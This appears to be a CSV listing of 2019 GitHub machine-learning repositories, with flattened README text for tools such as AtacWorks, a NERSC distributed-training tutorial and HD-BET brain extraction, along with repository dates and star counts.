Notebook,BobaZooba,User,2,13,4,46,master,BobaZooba#AnastasijaKravtsova,2,0,0,0,0,0,2
clara-genomics,AtacWorks,n/a,AtacWorks AtacWorks is a deep learning toolkit for track denoising and peak calling from low coverage or low quality ATAC Seq data AtacWorks data readme atacworksslides gif AtacWorks trains a deep neural network to learn a mapping between noisy low coverage low quality ATAC Seq data and matching clean high coverage high quality ATAC Seq data from the same cell type Once this mapping is learned the trained model can be applied to improve other noisy ATAC Seq datasets AtacWorks models can be trained using one or more pairs of matching ATAC Seq datasets from the same cell type AtacWorks requires three specific inputs for each such pair of datasets 1 A coverage track representing the number of sequencing reads mapped to each position on the genome in the low quality dataset 2 A coverage track representing the number of sequencing reads mapped to each position on the genome in the high quality dataset 3 The genomic positions of peaks called on the high quality dataset These can be obtained by using MACS2 or any other peak caller The model learns a mapping from 1 to both 2 and 3 in other words from the noisy coverage track it learns to predict both the clean coverage track and the positions of peaks in the clean dataset We also provide pretrained models that can be applied to a noisy dataset Much more information and examples can be found in the AtacWorks preprint https www biorxiv org content 10 1101 829481 Runtime Training Approximately 22 minutes per epoch to train on single whole genome Inference Approximately 28 minutes for inference and postprocessing on a whole genome Training and inference were performed on a single Tesla V100 GPU Training time can be significantly reduced by using multiple GPUs We are working to improve runtime particularly for inference Improvements are tracked on our project board https github com clara genomics AtacWorks projects Clone repository Latest released version This will clone the repo to the master branch which contains code for latest released version and hot fixes git clone recursive b master https github com clara genomics AtacWorks git Latest development version This will clone the repo to the default branch which is set to be the latest development branch This branch is subject to change frequently as features and bug fixes are pushed bash git clone recursive https github com clara genomics AtacWorks git System Setup System requirements Ubuntu 16 04 CUDA 9 0 Python 3 6 7 GCC 5 Optional A conda or virtualenv setup Any NVIDIA GPU AtacWorks training and inference currently does not run on CPU Install dependencies Download bedGraphToBigWig and bigWigToBedGraph binaries and add to your PATH rsync aP rsync hgdownload soe ucsc edu genome admin exe linux x8664 bedGraphToBigWig rsync aP rsync hgdownload soe ucsc edu genome admin exe linux x8664 bigWigToBedGraph export PATH PATH Install pip dependencies pip install r requirements pip txt Unit tests python m pytest tests Workflow 1 Convert peak calls on the clean data to bigWig format with peak2bw py 2 Generate genomic intervals for training validation holdout with getintervals py 3 Encode the training validation holdout data into h5 format with bw2h5 py 4 Train a model with main py 5 Apply the trained model for inference on another dataset with main py producing output in bigWig or bedGraph format Workflow input Training 1 bigWig file for clean ATAC Seq 2 bigWig file for noisy ATAC Seq 3 MACS2 output for clean ATAC Seq narrowPeak or bed file Testing 1 bigWig file for noisy ATAC Seq Workflow Example 1 Run the following script to validate your setup example run sh Pretrained models 3 pretrained models are provided in data pretrainedmodels bulkblooddata These are based on bulk ATAC Seq data from 7 blood cell types They are trained using clean data of depth 80 million reads subsampled to a depth of 1 million 1000000 7cell resnet 5 2 15 8 50 0803 pth tar 2 million 2000000 7cell resnet 5 2 15 8 50 0803 pth tar or 5 million 5000000 7cell resnet 5 2 15 8 50 0803 pth tar reads FAQ 1 What s the preferred way for setting up the environment A A virtual environment or conda installation is preferred You can follow conda installation instructions on their website and then follow the instructions in the README 2 If you face no module named numpy error while installing requirement pip txt A In your terminal run pip install numpy and then run pip install r requirements pip txt If you are running inside a conda or venv run these commands inside your environment Citation Lal A Chiang Z D Yakovenko N Duarte F M Israeli J and Buenrostro J D 2019 AtacWorks A deep convolutional neural network toolkit for epigenomics BioRxiv p 829481,2019-08-30T17:22:49Z,2019-12-12T23:30:02Z,Python,clara-genomics,Organization,8,13,4,133,dev-v0.2.0,avantikalal#tijyojwad#ntadimeti,3,2,2,20,24,3,42
NERSC,sc19-dl-tutorial,n/a,SC19 Tutorial Deep Learning At Scale This repository contains the material for the SC19 tutorial Deep Learning at Scale Here you will links to slides and resources as well as all the code for the hands on sessions It contains specifications for a few datasets a couple of CNN models and all the training code to enable training the models in a distributed fashion using Horovod As part of the tutorial you will 1 Train a simple CNN to classify images from the CIFAR10 dataset on a single node 2 Train a ResNet model to classify the same images on multiple nodes Contents Links https github com NERSC sc19 dl tutorial links Installation https github com NERSC sc19 dl tutorial installation Navigating the repository https github com NERSC sc19 dl tutorial navigating the repository Hands on walk through https github com NERSC sc19 dl tutorial hands on walk through Single node training example https github com NERSC sc19 dl tutorial single node training example Multi node training example https github com NERSC sc19 dl tutorial multi node training example Advanced example multi node ResNet50 on ImageNet 100 https github com NERSC sc19 dl tutorial advanced example multi node resnet50 on imagenet 100 Code references https github com NERSC sc19 dl tutorial code references Links Presentation slides https drive google com drive folders 1KJm08Ry4qJXOl19MAu2Ao1tfRNaMwZn usp sharing NERSC JupyterHub https jupyter nersc gov Join Slack https join slack com t nersc dl tutorial sharedinvite enQtODMzMzQ1MTI5OTUyLWNlNzg2MjBkODIwODRlNTBkM2M4MjI0ZDk2ZDU4N2M3NjU5MDk1NTRmMTFhNWRkMTk0NGNhMzQ3YjU2NzU5NTk Installation 1 Start a terminal on Cori either via ssh or from the Jupyter interface 2 Clone the repository using git git clone https github com NERSC sc19 dl tutorial git That s it The rest of the software Keras TensorFlow is pre installed on Cori and loaded via the scripts used below Navigating the repository train py the main training script which can be steered with YAML configuration files data folder containing the specifications of the datasets Each dataset has a corresponding name which is mapped to the specification in data init py models folder containing the Keras model definitions Again each model has a name which is interpreted in models init py configs folder containing the configuration files Each configuration specifies a dataset a model and all relevant configuration options with some exceptions like the number of nodes which is specified instead to SLURM via the command line scripts contains an environment setup script and some SLURM scripts for easily submitting the example jobs to the Cori batch system utils contains additional useful code for the training script e g custom callbacks device configuration and optimizers logic hpo contains READMEs and examples for HPO hands on Hands on walk through Go through the following steps as directed by the tutorial presenters Discuss the questions with your neighbors Single node training example We will start with single node training of a simple CNN to classify images from the CIFAR10 dataset 1 Take a look at the simple CNN model defined here models cnn py models cnn py Consider the following things Note how the model is constructed as a sequence of layers Note the structure of alternating convolutions pooling and dropout Identify the classifier head of the model the part which computes the class probabilities Can you figure out what the Flatten layer does here and why it is needed 2 Now take a look at the dataset code for CIFAR10 data cifar10 py data cifar10 py Keras has a convenient API for CIFAR10 which will automatically download the dataset for you Ask yourself why do we scale the dataset by 1 255 Note where we convert the labels integers to categorical class vectors Ask yourself why do we have to do this What kinds of data augmentation are we applying 3 Next take a look at the training script train py train py Identify the part where we retrieve the dataset Identify the section where we retrieve the CNN model the optimizer and compile the model Now identify the part where we do the actual training 4 Finally look at the configuration file configs cifar10cnn yaml configs cifar10cnn yaml YAML allows to express configurations in rich human readable hierarchical structure Identify where you would edit to modify the optimizer learning rate batch size etc 5 Now we are ready to submit our training job to the Cori batch system We have provided SLURM scripts to make this as simple as possible To run the simple CNN training on CIFAR10 on a single KNL node simply do sbatch scripts cifarcnn sh Important the first time you run a CIFAR10 example it will automatically download the dataset If you have more than one job attempting this download simultaneously it will likely fail 6 Check on the status of your job by running sqs Once the job starts running you should see the output start to appear in the slurm log file logs cifar cnn out 7 When the job is finished check the log to identify how well your model learned to solve the CIFAR10 classification task For every epoch you should see the loss and accuracy reported for both the training set and the validation set Take note of the best validation accuracy achieved Multi node training example To demonstrate scaling to multiple nodes we will switch to a larger more complex ResNet model This model can achieve higher accuracy than our simple CNN but it is quite a bit slower to train By parallelizing the training across nodes we should be able to achieve a better result than our simple CNN in a practical amount of time 1 Check out the ResNet model code in models resnet py models resnet py Note this is quite a bit more complex than the simple CNN In fact the model code is broken into multiple functions for easy reuse We provide here two versions of ResNet models a standard ResNet50 with 50 layers and a smaller ResNet consisting of 26 layers Identify the identy block and conv block functions How many convolutional layers do each of these have Identify the functions that build the ResNet50 and the ResNetSmall Given how many layers are in each block see if you can confirm how many layers conv and dense are in the models Hint we don t normally count the convolution applied to the shortcuts 2 Inspect the optimizer setup in utils optimizers py utils optimizers py Note how we scale the learning rate lr according to the number of processes ranks Note how we construct our optimizer and then wrap it in the Horovod DistributedOptimizer 3 Inspect train py train py once again Identify the initworkers function where we initialize Horovod Note where this is invoked in the main function right away Identify where we setup our training callbacks Which callback ensures we have consistent model weights at the start of training Identify the callbacks responsible for the learning rate schedule warmup and decay That s mostly it for the code Note that in general when training distributed you might want to use more complicated data handling e g to ensure different workers are always processing different samples of your data within a training epoch In this case we aren t worrying about that and are for simplicity relying on the independent random shuffling of the data by each worker as well as the random data augmentation 4 optional To gain an appreciation for the speedup of training on multiple nodes you can first try to train the ResNet model on a single node Adjust the configuration in configs cifar10resnet yaml configs cifar10resnet yaml to train for just 1 epoch and then submit the job with sbatch N 1 scripts cifarresnet sh 5 Now we are ready to train our ResNet model on multiple nodes using Horovod and MPI If you changed the config to 1 epoch above be sure to change it back to 32 epochs for this step To launch the ResNet training on 4 nodes do sbatch N 4 scripts cifarresnet sh 6 As before watch the log file logs cifar resnet out when the job starts You ll see some printouts from every worker Others are only printed from rank 0 7 When the job is finished look at the log and compare to the simple CNN case above If you ran step 4 compare the time to train one epoch between single node and multi node Did your model manage to converge to a better validation accuracy than the simple CNN Now that you ve finished the main tutorial material try to play with the code and or configuration to see the effect on the training results You can try changing things like Change the optimizer search for Keras optimizers on google Change the nominal learning rate number of warmup epochs decay schedule Change the learning rate scaling e g try sqrt scaling instead of linear Most of these things can be changed entirely within the configuration See configs imagenetresnet yaml configs imagenetresnet yaml for examples Hyperparameter Optimization The following examples will walk you through how to utilize distributed hyperparameter optimization with the Cray HPO package For documentation reference see the Cray HPO documentation https cray github io crayai hpo hpo html Example Hello World HPO examples This is a set of quick running examples that you may view and run to get acquainted with the Cray HPO interface Further instructions are in hpo sin README md Example Applying distributed HPO to CNN CIFAR10 example In this example we will be optimizing the hyperparameters of the CNN single node training example from before 1 Take a look train py again and follow the hpo argument Note that the loss value is being emitted when this argument is set which is necessary to communicate the figure of merit back to the Cray HPO optimizer Additionally inspect the configs hpocifar10cnn yaml configuration and note that the number of epochs has been scaled down significantly so that this example can run to completion in a reasonable amount of time 2 Take a look at the hpotrain py HPO driver This script sets up the evaluator hyperparameter search space and optimizer Make sure you understand the HPO code by trying to answer these questions What hyperparameters are being optimized Which optimizer is being used for this example How many evaluations of train py will this optimization run 3 Now we are ready to run our hyperparameter optimization Similar to before a SLURM script is provided to run the HPO driver on 8 KNL nodes sbatch scripts hpocifarcnn sh This HPO run should take a while Feel free to move on to the next example while this runs 4 Take a look at your job output file out in the logs directory Try to identify the following How much was your figure of merit improved What were the improved hyperparameter values found Example Optimizing topology of LeNet 5 This is an example of using Cray HPO to optimize hyperparameters for LeNet 5 trained on the MNIST hand written digits dataset This example is unique because the figure of merit is the elapsed training time until a threshold accuracy is reached to minimize time to accuracy Additionally this example shows how one can optimize network topology with other traditional hyperparameters Further instructions are in hpo mnist lenet5 README md Code references Keras ResNet50 official model https github com keras team keras applications blob master kerasapplications resnet50 py Horovod ResNet ImageNet example https github com uber horovod blob master examples kerasimagenetresnet50 py CIFAR10 CNN and ResNet examples https github com keras team keras blob master examples cifar10cnn py https github com keras team keras blob master examples cifar10resnet py,2019-08-24T00:53:40Z,2019-12-08T23:43:17Z,Jupyter Notebook,NERSC,Organization,18,13,8,67,master,sparticlesteve#ben-albrecht#azrael417#MustafaMustafa,4,0,0,0,0,0,6
LIX-shape-analysis,SURFMNet,n/a,SURFMNet Source code and data associated with the ICCV 19 oral paper Unsupervised Deep Learning for Structured Shape Matching will be maintained and updated here in future Dependency The code is tested under TF1 6 GPU version and Python 3 6 on Ubuntu 16 04 with CUDA 9 0 and cuDNN 7 It requires Python libraries numpy scipy Download Pre processed Mesh Data Please run bash Preparedata sh Shape Matching To train a DFMnet model to obtain matches between shapes without any ground truth or geodesic distance matrix using only a shape s Laplacian eigenvalues and eigenvectors and also Descriptors on shapes python trainDFMnet py To obtain matches after training for a given set of shapes python testDFMnet py Visualization of functional maps at each training step is possible with tensorboard tensorboard logdir Training Download GT Correspondence and precomputed pairwise matches for some baselines https drive google com open id 1qvqtJz zvMxC0ZMuFGbtlKxc9Py3Ggg Download Geodesic Matrices for Faust and Scape remesh from here https www dropbox com home preview Faustrtest zip https www dropbox com home preview scapetest zip Coming soon Pre trained model and evaluation script,2019-08-15T08:53:08Z,2019-12-13T14:28:40Z,Python,LIX-shape-analysis,User,2,13,5,23,master,Not-IITian#LIX-shape-analysis,2,0,0,0,4,0,0
ksivaman,adversarial-autoencoders,n/a,adversarial autoencoders Sklearn compatible estimators for securing deep learning models from malicious attacks,2019-09-15T02:48:19Z,2019-11-01T02:33:26Z,Python,ksivaman,User,1,13,0,29,master,ksivaman,1,0,0,0,0,0,0
TranSys2020,TranSys,n/a,TranSys Explaining Deep Learning Based Networked Systems TranSys is an integrated explainer to provide post hoc explanations for different types of Deep Learning DL based networked systems We refer the readers to the technical report https transys io TranSys TR pdf for more details In the current stage we provide the explanation methods and implementations for three DL based networked systems Pensieve explainpensieve is an adaptive video streaming algorithm based on deep reinforcement learning AuTO explainauto is an on switch traffic scheduler in datacenters under refactoring RouteNet explainroutenet is an SDN traffic optimizer to find routes for all src dst pairs We further provide several use cases of TranSys We troubleshoot the DNN in Pensieve and improve the average quality of experience QoE by up to 3 over DNN policies with only decision trees case1 With decision trees generated by TranSys we lightweightify Pensieve and AuTO and achieve shorter decision making latency by 27x on average and lower resource consumption by up to 156x case2 We also provide an efficient way to compare the latency of several paths in traffic optimization based on the explanations provided by TranSys case3 The running scripts for explanation methods and use cases could be found in respective directories Currently we are still working on documentating and refactoring the repository Other codes will be released very soon For any questions please post an issue or send an email to contact transys io mailto contact transys io Release Progress Directory Date explainpensieve Sep 22 2019 explainauto In progress explainroutenet Sep 23 2019 case1 In progress case2 Nov 20 2019 case3 Oct 31 2019 We anticipate all codes to be released soon Please stay tuned Citation articleanon2019transys title Explaining Deep Learning Based Networked Systems author Anonymous Authors journal Technical Report url https transys io tranSys TR pdf year 2019,2019-09-14T08:29:02Z,2019-12-15T03:16:03Z,JavaScript,TranSys2020,User,3,12,4,20,master,TranSys2020,1,0,0,0,1,0,1
flying-cabbage,drift_drl,autonomous-vehicles#deep-reinforcement-learning#driving-behavior#racing-car,High speed Autonomous Drifting with Deep Reinforcement Learning Reference trajectorires for seven maps Reference trajectories for the maps are located in code reftrajectory traj0 for map a for first stage training traj1 traj5 for map b f for second stage training traj6 for map g for evaluation Trained weights for different models weights are located in weights where four kinds of models are included Note that sac stg1 and sac stg2 are different stages of our SAC controller during training sac stg2 is the final version and sac stg1 are only trained on map a Test code run sh code test sh to test different models on map g with various setups The driving data timestamp speed location heading slip angle control commands etc will be recorded in code test after the testing process Project homepage https sites google com view autonomous drifting with drl,2019-09-12T12:16:24Z,2019-12-14T09:41:18Z,Python,flying-cabbage,User,1,12,2,1,master,flying-cabbage,1,0,0,0,0,0,0
soumyadip1995,Natural_Language_Processing_in_5_weeks,artificial-intelligence#deep-learning#machine-learning#natural-language-processing#natural-language-understanding#python#pytorch#tensorflow,Natural Language Processing in 5 weeks Python 3 6 https img shields io badge Python 20 3 6 2B orange https www python org downloads Build with PyTorch https img shields io badge Build 20with PyTorch red https pytorch org Week 1 Text Preprocessing Techniques and Basics for NLP Regularization Text Normalization stemming lemmatiziation tokenization and other basics of NLP Watch the videos https www youtube com watch v hyT BzLyVdU list PLDcmCgguL9rxTEz1Rsy6x5NhlBjI8z3Gz from video 1 to 13 by TO courses on YouTube Read the 2nd chapter https web stanford edu jurafsky slp3 on Regularization Text Normalization and Edit Distance by Stanford edu Read the blog post on Ultimate Guide to Understand and Implement Natural Language Processing with codes in Python https www analyticsvidhya com blog 2017 01 ultimate guide to understand implement natural language processing codes in python by Analytics Vidhya Read my blog post on Natural Language Processing A Beginner s Introduction https soumyadip1995 blogspot com 2019 05 natural language processing beginners html See my Jupyter NoteBook on the Beginner s introduction https github com soumyadip1995 NLP blob master NaturallanguageprocessingAbeginner sintroduction ipynb for the code Assignment Use NLTK to perform stemming lemmatiziation tokenization stopword removal on a dataset of your choice Week 2 Word Embeddings in Natural Language Processing Embedding Layers Word2vec GloVe Read the Blog Post on A Gentle Introduction to Statistical Language Modeling and Neural Language Models https machinelearningmastery com statistical language modeling and neural language models by Machine Learning Mastery Read the Material on Word2Vec Tutorial The Skip Gram Model http mccormickml com 2016 04 19 word2vec tutorial the skip gram model by Stanford edu CS224N Read the paper titled Efficient Estimation of Word Representations in Vector Space https www scihive org paper 1301 3781 Read the Material on GloVe Global Vectors for Word Representation http nlp stanford edu pubs glove pdf by Stanford edu CS224N Read my blog post on Word Embeddings here https soumyadip1995 blogspot com 2019 05 natural language processing word html See my Jupyter Notebook on Word Embeddings https github com soumyadip1995 NLP blob master NLPwordembeddings ipynb for the code Assignment 3 Assignments Visualize and Implement Word2Vec Create dependency parser all in PyTorch they are assigments from the stanford course Week 3 Lexicons and Language Models Pre Deep Learning Lexicons and Pre deep learning Statistical Language model pre deep learning Hidden Markov Models Topic Modeling with Latent Dirichlet Allocation Read the materials by CSEP 517 Natural Language Processing University of Washington Spring 2017 https courses cs washington edu courses csep517 17sp Read the Lectures from Text Classifiers to Machine Translation Lectures 2 to 6 Read Your Guide to Latent Dirichlet Allocation https medium com lettier how does lda work ill explain using emoji 108abf40fa7d by Lettier Watch the video on Topic Modeling with LDA https www youtube com watch v ZgyA1Q2ywbM on Youtube Week 4 Deep Sequence Models Sequence to Sequence Models translation summarization question answering Attention based models and Deep Semantic Similarity Watch the course Natural Language Processing https www coursera org learn language processing by Coursera Week 4 Read the blog post on DSSM Deep Semantic Similarity Model Building in TensorFlow https kishorepv github io DSSM by Kishore P V Read Chapter 10 Sequence Modeling Recurrent and Recursive Nets of the Deep Learning book by Ian Goodfellow https github com soumyadip1995 deep learning by ian goodfellow full pdf blob master deeplearningbook pdf Assignment 3 Assignments create a translator and a summarizer All sequence to sequence models In PyTorch Week 5 Dialog Systems and Transfer Learning Speech Recognition Dialog Managers Natural Language Understanding and Transfer Learning Watch the course Natural Language Processing https www coursera org learn language processing by Coursera Week 5 Read the Material on Dialog Systems and ChatBots https web stanford edu jurafsky slp3 24 pdf by stanford edu Read the blog post on NLP Imagenet http ruder io nlp imagenet by Sebastian Ruder Read the blog post on Generalized Language Models https lilianweng github io lil log 2019 01 31 generalized language models html by Lilian Weng Watch Siraj Raval s video How to Build a Biomedical Startup https www youtube com watch v J9kbZ5I8gdM on Youtube Read Transfer learning with BERT GPT 2 ELMO http jalammar github io illustrated bert by Jay Alammar Assignment Try and Replicate my Project TextBrain Building an AI startup using Natural Language Processing https github com soumyadip1995 TextBrain Building an AI start up using NLP Play with Hugging Face Pytorch Transformers https github com huggingface pytorch pretrained BERT examples pick 2 models use it for one of 9 Down Stream tasks compare their results,2019-08-19T16:29:46Z,2019-12-05T10:31:46Z,n/a,soumyadip1995,User,5,12,2,44,master,soumyadip1995,1,0,0,0,0,0,2
lugq1990,machine-learning-notebook-series,deeplearning#machine-learning#python,machine learning notebook series This tutorial is machine learning and deep learning domain this contains whole steps from Feature Engineering Model Building Model Selection Model Evalution for machine learnig that should be used with step by step comments in these notebooks If you need to learn math basic for machine learing you could also take a look at Linear Algebra if you want to plot some graphs during your training step you could also glimpse Matplotlib and Seaborn tutorials if you need to learn something about popular frameworks like TensorFlow and PyTorch in deep learning you could also get these tutorials bellow There are also some data structures with pure python implement you could also take a reference Dependencies Python 3 6 numpy 1 17 0 pandas 0 25 0 matplotlib 2 2 4 seaborn 0 9 0 sklearn 0 21 3 PyTorch 1 2 0 TensorFlow 1 14 0 Keras 2 1 2 Tutorial Lists You could just dive into the parts that interest you Python Tutorials Data Structures Data structures jupyter https github com lugq1990 machine learning beginner jupyter series blob master Data 20Structure 20Tutorial ipynb Queue https github com lugq1990 machine learning beginner jupyter series blob master datastructures queues py Stack https github com lugq1990 machine learning beginner jupyter series blob master datastructures stack py Linked List https github com lugq1990 machine learning beginner jupyter series blob master datastructures linkedlist py Doubly Linked List https github com lugq1990 machine learning beginner jupyter series blob master datastructures doublylinkedlist py Binary Search Tree https github com lugq1990 machine learning beginner jupyter series blob master datastructures binarysearchtree py Plot Tutorials Matplotlib Tutorial https github com lugq1990 machine learning beginner jupyter series blob master Matplotlib 20Tutorial ipynb Seaborn Tutorial https github com lugq1990 machine learning beginner jupyter series blob master Seaborn 20Tutorial ipynb Machine Learning Tutorials Linear Algebra Linear Algebra Tutorial https github com lugq1990 machine learning beginner jupyter series blob master Linear 20Algebra 20Tutorial ipynb Machine Learning Pipeline Preprocessing Tutorial https github com lugq1990 machine learning beginner jupyter series blob master preprocessing 20turorial ipynb Natural Language Preprocessing Tutorial https github com lugq1990 machine learning beginner jupyter series blob master Natural 20language 20preprocessing 20tutorial ipynb Common Algorithms https github com lugq1990 machine learning beginner jupyter series blob master Common 20Algorithms 20needed 20to 20use ipynb Model Parameters Tuning https github com lugq1990 machine learning beginner jupyter series blob master Parameter 20tuning ipynb Model Selection Tutorial https github com lugq1990 machine learning beginner jupyter series blob master Model 20Selection 20Tutorial ipynb Whole Model Building Pipeline https github com lugq1990 machine learning beginner jupyter series blob master Whole 20model 20building 20pipeline ipynb Deep Learning Tutorials PyTorch Starts Here Tutorial https github com lugq1990 machine learning beginner jupyter series blob master PyTorch 20Tutorial ipynb PyTorch Linear Regression Tutorial https github com lugq1990 machine learning beginner jupyter series blob master PyTorches Linear 20Regression ipynb PyTorch Logistic Regression Tutorial https github com lugq1990 machine learning beginner jupyter series blob master PyTorches Logistic 20Regression ipynb PyTorch Feed Forward Network Tutorial https github com lugq1990 machine learning beginner jupyter series blob master PyTorches Feed 20Forward 20Network ipynb PyTorch Convolutional network Tutorial https github com lugq1990 machine learning beginner jupyter series blob master PyTorches Convolutional 20network ipynb PyTorch LSTM Tutorial https github com lugq1990 machine learning beginner jupyter series blob pytorch PyTorches LSTM 20tutorial ipynb PyTorch Bidirectional LSTM Tutorial https github com lugq1990 machine learning beginner jupyter series blob pytorch PyTorches Bidirectional 20LSTM 20Tutorial ipynb TensorFlow Starts Here Tutorial https github com lugq1990 machine learning notebook series blob master TensorFlowes Basic 20classification 20with 20TensorFlow ipynb Keras tutorial https github com lugq1990 machine learning notebook series blob master TensorFlowes Keras 20Tutorial ipynb Additional Materials Here you could get something useful for machine learning basic I really recommend you should reference these materials for theory Machine Learning Cheatsheet https github com lugq1990 machine learning beginner jupyter series blob master usefulmaterials General super cheatsheet machine learning pdf Probability Cheatsheet https github com lugq1990 machine learning beginner jupyter series blob master usefulmaterials General probabilitycheatsheet pdf How to read paper https github com lugq1990 machine learning beginner jupyter series blob master usefulmaterials General HowtoReadPaper pdf Review of Linear Algebra https github com lugq1990 machine learning beginner jupyter series blob master usefulmaterials math Linear 20Algebra 20Review pdf Review of Probability https github com lugq1990 machine learning beginner jupyter series blob master usefulmaterials math Review 20of 20probability pdf I will put more and more tutorials in this series steadily I m really glad to hear your voice for these tutorials if you learn something from this repository I will be happier TODO LIST Algorithms preprocessing for image tutorials Basic DNN tutorials CNN tutorials RNNLSTMGRU tutorials AttensionTransformer tutorials Modules NLTK tutorials Gensim tutorials Keras tutorials TensorFlow tutorials MXNet tutorials PySpark tutorials,2019-08-20T06:50:58Z,2019-09-20T03:09:37Z,Jupyter Notebook,lugq1990,User,3,11,3,24,master,lugq1990,1,0,0,0,0,0,2
forin-xyz,Keras-HSIC-Bottleneck,n/a,Keras HSIC Bottleneck The Keras Implementation of the paper The HSIC Bottleneck Deep Learning without Back Propagation https arxiv org abs 1908 01580,2019-08-28T05:25:09Z,2019-12-03T13:03:49Z,Python,forin-xyz,User,3,11,4,2,master,forin-xyz,1,0,0,0,0,0,0
NeuroAI-HD,HD-BET,n/a,HD BET This repository provides easy to use access to our recently published HD BET brain extraction tool HD BET is the result of a joint project between the Department of Neuroradiology at the Heidelberg University Hospital and the Division of Medical Image Computing at the German Cancer Research Center DKFZ If you are using HD BET please cite the following publication Isensee F Schell M Tursunova I Brugnara G Bonekamp D Neuberger U Wick A Schlemmer HP Heiland S Wick W Bendszus M Maier Hein KH Kickingereder P Automated brain extraction of multi sequence MRI using artificial neural networks Hum Brain Mapp 2019 113 https doi org 10 1002 hbm 24750 Compared to other commonly used brain extraction tools HD BET has some significant advantages HD BET was developed with MRI data from a large multicentric clinical trial in adult brain tumor patients acquired across 37 institutions in Europe and included a broad range of MR hardware and acquisition parameters pathologies or treatment induced tissue alterations We used 2 3 of data for training and validation and 1 3 for testing Moreover independent testing of HD BET was performed in three public benchmark datasets NFBS LPBA40 and CC 359 HD BET was trained with precontrast T1 w postcontrast T1 w T2 w and FLAIR sequences It can perform independent brain extraction on various different MRI sequences and is not restricted to precontrast T1 weighted T1 w sequences Other MRI sequences may work as well just give it a try HD BET was designed to be robust with respect to brain tumors lesions and resection cavities as well as different MRI scanner hardware and acquisition parameters HD BET outperformed five publicly available brain extraction algorithms FSL BET AFNI 3DSkullStrip Brainsuite BSE ROBEX and BEaST across all datasets and yielded median improvements of 1 33 to 2 63 points for the DICE coefficient and 0 80 to 2 75 mm for the Hausdorff distance Bonferroni adjusted p 0 001 HD BET is very fast on GPU with 10s run time per MRI sequence Even on CPU it is not slower than other commonly used tools Installation Instructions 1 Clone this repository bash git clone https github com MIC DKFZ HD BET 2 Go into the repository the folder with the setup py file and install cd HD BET pip install e 3 Per default model parameters will be downloaded to hd betparams If you wish to use a different folder open HDBET paths py in a text editor and modify folderwithparameterfiles How to use it Using HDBET is straightforward You can use it in any terminal on your linux system The hd bet command was installed automatically We provide CPU as well as GPU support Running on GPU is a lot faster though and should always be preferred Here is a minimalistic example of how you can use HD BET you need to be in the HDBET directory bash hd bet i INPUTFILENAME INPUTFILENAME must be a nifti nii gz file containing 3D MRI image data 4D image sequences are not supported however can be splitted upfront into the individual temporal volumes using fslsplit1 INPUTFILENAME can be either a pre or postcontrast T1 w T2 w or FLAIR MRI sequence Other modalities might work as well Input images must match the orientation of standard MNI152 template Use fslreorient2std 2 upfront to ensure that this is the case By default HD BET will run in GPU mode use the parameters of all five models which originate from a five fold cross validation use test time data augmentation by mirroring along all axes and not do any postprocessing For batch processing it is faster to process an entire folder at once as this will mitigate the overhead of loading and initializing the model for each case bash hd bet i INPUTFOLDER o OUTPUTFOLDER The above command will look for all nifti files nii gz in the INPUTFOLDER and save the brain masks under the same name in OUTPUTFOLDER GPU is nice but I don t have one of those What now HD BET has CPU support Running on CPU takes a lot longer though and you will need quite a bit of RAM To run on CPU we recommend you use the following command bash hd bet i INPUTFOLDER o OUTPUTFOLDER device cpu mode fast tta 0 This works of course also with just an input file bash hd bet i INPUTFILENAME device cpu mode fast tta 0 The options mode fast and tta 0 will disable test time data augmentation speedup of 8x and use only one model instead of an ensemble of five models for the prediction More options For more information please refer to the help functionality bash hd bet help FAQ 1 How much GPU memory do I need to run HD BET We ran all our experiments on NVIDIA Titan X GPUs with 12 GB memory For inference you will need less but since inference in implemented by exploiting the fully convolutional nature of CNNs the amount of memory required depends on your image Typical image should run with less than 4 GB of GPU memory consumption If you run into out of memory problems please check the following 1 Make sure the voxel spacing of your data is correct and 2 Ensure your MRI image only contains the head region 2 Will you provide the training code as well No The training code is tightly wound around the data which we cannot make public 3 What run time can I expect on CPU GPU This depends on your MRI image size Typical run times preprocessing postprocessing and resampling included are just a couple of seconds for GPU and about 2 Minutes on CPU using tta 0 mode fast 1https fsl fmrib ox ac uk fsl fslwiki Fslutils 2https fsl fmrib ox ac uk fsl fslwiki Orientation 20Explained,2019-09-02T09:00:54Z,2019-12-10T12:36:36Z,Python,NeuroAI-HD,Organization,2,11,0,31,master,FabianIsensee,1,0,0,0,0,0,0
wu-huipeng,Deep-Learning,n/a,Deep Learning TensorFlowPytorchdeep learning mdstar QQ 965546422 TensorFlow https github com wu huipeng Deep Learning tree master TensorFlow 1 MNIST https github com wu huipeng Deep Learning tree master TensorFlow MNIST 1 OpenCV https github com wu huipeng Deep Learning blob master TensorFlow MNIST MNIST ipynb 2 https github com wu huipeng Deep Learning blob master TensorFlow MNIST MNIST md 2 MNIST https github com wu huipeng Deep Learning tree master TensorFlow DCGAN 20FOR 20MNIST 1 https github com wu huipeng Deep Learning blob master TensorFlow DCGAN 20FOR 20MNIST DCGAN 20for 20mnist ipynb 2 https github com wu huipeng Deep Learning blob master TensorFlow DCGAN 20FOR 20MNIST DCGAN md 3 https github com wu huipeng Deep Learning tree master TensorFlow FaceRecognize 1 https github com wu huipeng Deep Learning blob master TensorFlow FaceRecognize OpenCV 20and 20tf ipynb 2 https github com wu huipeng Deep Learning blob master TensorFlow FaceRecognize E4 BA BA E8 84 B8 E8 AF 86 E5 88 AB ipynb 3 https github com wu huipeng Deep Learning blob master TensorFlow FaceRecognize facerecognize md Pyotrch https github com wu huipeng Deep Learning tree master Pytorch 1 TKPytorch https github com wu huipeng Deep Learning tree master Pytorch Sex 20recognize 1 https github com wu huipeng Deep Learning blob master Pytorch Sex 20recognize trainpytorch py 2 Tk GUI https github com wu huipeng Deep Learning blob master Pytorch Sex 20recognize GUI py 3 https github com wu huipeng Deep Learning blob master Pytorch Sex 20recognize sex md 2 https github com wu huipeng Deep Learning tree master Pytorch fashion 1 https github com wu huipeng Deep Learning blob master Pytorch fashion fashion ipynb 2 https github com wu huipeng Deep Learning blob master Pytorch fashion fashion md 3 https github com wu huipeng Deep Learning tree master Pytorch gesture 20recognition 1 https github com wu huipeng Deep Learning blob master Pytorch gesture 20recognition E6 89 8B E5 8A BF E8 AF 86 E5 88 AB py 2 https github com wu huipeng Deep Learning blob master Pytorch gesture 20recognition gesture 20recognition md 4 https github com wu huipeng Deep Learning tree master Pytorch Verification 20code 20identification 1 https github com wu huipeng Deep Learning blob master Pytorch Verification 20code 20identification model py 2 https github com wu huipeng Deep Learning blob master Pytorch Verification 20code 20identification test py 3 https github com wu huipeng Deep Learning blob master Pytorch Verification 20code 20identification Verification 20code 20identification md TensorFlow2 0 https github com wu huipeng Deep Learning tree master TensorFlow object detection Pytorch https github com wu huipeng 